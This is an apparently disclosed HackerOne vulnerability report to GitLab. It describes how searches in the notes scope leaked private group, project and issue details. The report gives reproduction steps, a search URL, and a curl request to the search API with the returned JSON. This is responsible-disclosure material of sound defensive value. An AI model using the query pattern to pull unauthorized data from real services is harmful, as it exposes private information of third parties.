# Elasticsearch leaks data through the notes scope

## Report Details
- **Report ID**: 710006
- **URL**: https://hackerone.com/reports/710006
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-08T21:45:57.718Z
- **Disclosed**: 2020-10-06T21:57:20.940Z

## Reporter
- **Username**: rpadovani
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

The Elasticsearch results, when filtering using the `notes` scope, leaks data about private groups, private projects, and private issues.

### Steps to reproduce

1. Search, as an anonymous user, `nextbit` in the Gitlab group, filtering for "comments" ([link](https://gitlab.com/search?group_id=9970&repository_ref=&scope=notes&search=nextbit&snippets=))
2. You will have as result a private note saying `Riccardo Padovani mentioned in nextbit/virtualcore/gui#109` (see screenshot). This basically leaks information about the existence of a private group, a private subgroup, a private project, the ID of an issue in the project, and a membership of the project. 3. You can also retrieve more data through the APIs:

```
19:55:18 in ~ 
➜ curl "https://gitlab.com/api/v4/projects/278964/search?scope=notes&search=nextbit" --header "PRIVATE-TOKEN: TEST" | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   520  100   520    0     0    508      0  0:00:01  0:00:01 --:--:--   508
[
  {
    "id": 215547575,
    "type": null,
    "body": "mentioned in issue nextbit/VirtualCore/gui#109",
    "attachment": null,
    "author": {
      "id": 16048,
      "name": "Riccardo Padovani",
      "username": "rpadovani",
      "state": "active",
      "avatar_url": "https://secure.gravatar.com/avatar/9d89d4072afb4457b0c49131d8d258f5?s=80&d=identicon",
      "web_url": "https://gitlab.com/rpadovani"
    },
    "created_at": "2019-02-19T12:54:23.670Z",
    "updated_at": "2019-02-19T12:54:23.670Z",
    "system": true,
    "noteable_id": 24685040,
    "noteable_type": "Issue",
    "resolvable": false,
    "noteable_iid": 25362
  }
]
``` 

The token used is from another account, whom doesn't have access to `nextbit`, or doesn't have any relation with the mentioned issue. It is necessary 'cause search APIs can be used only by logged users.

The ID of the project where we perform the search is the Gitlab one.

### Impact

Elasticsearch doesn't properly authorize access to the notes in search results, so there are leaks of private data, given the right search query.

### Output of checks

This bug happens on GitLab.com

## Impact

Elasticsearch doesn't properly authorize access to the notes in search results, so there are leaks of private data, given the right search query

## Attachments
- Screenshot_2019-10-08_nextbit___Search.png
